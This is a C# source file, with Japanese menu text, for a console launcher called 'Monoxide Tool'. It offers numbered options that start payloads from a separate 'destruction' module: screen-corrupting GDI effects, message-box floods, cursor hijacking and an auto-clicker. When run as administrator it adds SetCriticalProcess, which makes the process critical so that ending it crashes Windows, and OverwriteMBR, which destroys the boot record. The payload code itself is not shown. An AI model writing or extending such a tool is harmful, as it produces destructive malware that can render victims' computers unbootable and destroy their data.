using System;
using System.Threading;
using System.Security.Principal;
using static Monoxide.Import;
using static Monoxide.destruction;

namespace Monoxide
{
    public static class MonoxideTool
    {
        public static void LoadMonoxideTool()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            bool bool_admin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            if(bool_admin == true)
            {
                Console.Title = "Monoxide Tool b1.0 - Administrator";
            }
            else if(bool_admin == false)
            {
                Console.Title = "Monoxide Tool b1.0";
            }

            for (; ; )
            {
                Console.WriteLine("Monoxide Tool");
                Console.WriteLine("Loading...");
                Thread.Sleep(2000);
                Console.Clear();
                Console.WriteLine("Monoxide Tool version beta1.0");
                Console.WriteLine("");
                Console.WriteLine("1, AllRandomGDIThreadStart");
                Console.WriteLine("2, GDIThreadStart");
                Console.WriteLine("3, GDICursorDraw");
                Console.WriteLine("4, MessageBoxThread");
                Console.WriteLine("5, AllAudioThreadStart");
                Console.WriteLine("6, CursorMovement");
                Console.WriteLine("7, Clicker");
                Console.WriteLine("8, WARNING");

                if (bool_admin == true)
                {
                    Console.WriteLine("9, SetCriticalProcess");
                    Console.WriteLine("10, OverwriteMBR");
                }

                Console.WriteLine("");
                Console.WriteLine("0, Monoxide Toolを閉じる。");
                Console.WriteLine("");
                Console.WriteLine("実行したいもののNo.を入力してください。");

                int n = int.Parse(Console.ReadLine());

                

                if (n == 0)
                {
                    Environment.Exit(0);
                }
                if (n == 1)
                {
                    LoadAllGdiStart();
                }
                else if (n == 2)
                {
                    LoadGdiThreadStart();
                }
                else if (n == 3)
                {
                    LoadCursorDraw();
                }
                else if (n == 4)
                {
                    LoadMsgBoxThread();
                }
                else if (n == 5)
                {
                    LoadAllAudioStart();
                }
                else if (n == 6)
                {
                    LoadCursorMovement();
                }
                else if (n == 7)
                {
                    LoadClicker();
                }
                else if (n == 8)
                {
                    LoadWARNING();
                }
                if (bool_admin == true)
                {
                     if (n == 9)
                    {
                        LoadSetCritical();
                    }
                    if (n == 10)
                    {
                        OverwriteMBR();
                    }
                }
            }
        }
        private static void LoadAllGdiStart()
        {
            new Thread(new ThreadStart(AllGdiStart)).Start();
            return;
        }
        private static void LoadGdiThreadStart()
        {
            Console.WriteLine("起動したいGDIのNo.を入力してください。");
            int number = int.Parse(Console.ReadLine());
            Initialize();
            //new Thread(new ThreadStart(() => { GdiThreadStart(number); }));
            GdiThreadStart(number);
            return;
        }
        public static void LoadCursorDraw()
        {
            Initialize();
            new Thread(new ThreadStart(CursorDraw)).Start();
            return;
        }
        public static void LoadMsgBoxThread()
        {
            Initialize();
            new Thread(new ThreadStart(MsgBoxThread)).Start();
            return;
        }
        public static void LoadAllAudioStart()
        {
            new Thread(new ThreadStart(AllAudioStart)).Start();
            return;
        }
        public static void LoadCursorMovement()
        {
            new Thread(new ThreadStart(CursorMovement)).Start();
            return;
        }
        public static void LoadClicker()
        {
            new Thread(new ThreadStart(Clicker)).Start();
            return;
        }
        public static void LoadWARNING()
        {
            new Thread(new ThreadStart(WARNING)).Start();
            return;
        }
        public static void LoadSetCritical()
        {
            SetCriticalProcess();
            return;
        }
    }
}
